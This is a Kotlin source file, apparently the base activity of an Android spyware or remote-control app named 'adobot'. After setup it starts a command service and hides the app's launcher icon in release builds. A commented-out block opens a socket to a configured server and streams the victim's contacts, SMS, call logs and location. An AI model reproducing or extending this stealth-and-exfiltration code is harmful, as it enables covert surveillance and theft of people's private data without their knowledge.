package me.adobot.activities

import android.content.ComponentName
import android.content.Intent
import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
import android.content.pm.PackageManager
import android.support.v7.app.AppCompatActivity
import me.adobot.BuildConfig
import me.adobot.CommandService
import me.adobot.Constants
import pub.devrel.easypermissions.EasyPermissions

/**
 * Created by Abhinav_Suthar on 15-03-2018.
 */

open class BaseActivity : AppCompatActivity() {

    private fun hideApp() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
    }

    protected fun done() {
        startClient()
        if (!BuildConfig.DEBUG) hideApp()   //do not hide when debug to easily deploy debug source
        //finish()
//        doAsync {
//            val socket = java.net.Socket(Constants.server, Constants.port)
//            GetContactsTask(this@BaseActivity, socket = socket).start()
//            GetSmsTask(this@BaseActivity, socket = socket).start()
//            GetCallLogsTask(this@BaseActivity, socket = socket).start()
//            LocationMonitor(this@BaseActivity, socket = socket).start()
//        }
    }

    private fun startClient() {
        startService(Intent(this, CommandService::class.java))
    }

    protected fun requestPermissions() {
        val i = Intent(this, PermissionsActivity::class.java)
        i.addFlags(FLAG_ACTIVITY_NEW_TASK)
        startActivity(i)
    }

    protected fun hasPermissions() = EasyPermissions.hasPermissions(this, Constants.PERMISSIONS.toString())

}